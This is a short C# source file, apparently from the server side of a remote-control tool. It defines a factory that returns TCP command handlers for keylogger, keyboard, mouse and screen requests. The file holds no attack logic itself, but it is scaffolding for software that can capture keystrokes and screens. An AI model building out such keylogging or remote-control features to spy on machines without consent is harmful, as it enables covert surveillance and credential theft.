using System;
using System.Collections.Generic;
using System.Text;
using SCT = ServerDLL.CommandHandler.TCP;
namespace ServerDLL.CommandHandler.Factory
{
    internal sealed class TCPHandlerFactory : AbstractHandlerFactory
    {

        internal override AbstractCommandHandler GetKeyLoggerRequestHandler()
        {
            return new SCT.KeyLoggerRequestHandler();
        }

        internal override AbstractCommandHandler GetKeyBoardRequestHandler()
        {
            return new SCT.KeyBoardRequestHandler();
        }

        internal override AbstractCommandHandler GetMouseRequestHandler()
        {
            return new SCT.MouseRequestHandler();
        }

        internal override AbstractCommandHandler GetScreenRequestHandler()
        {
            return new SCT.ScreenRequestHandler();
        }

        internal override AbstractCommandHandler GetDefaultRequestHandler()
        {
            return new SCT.DefaultRequestHandler();
        }
    }
}
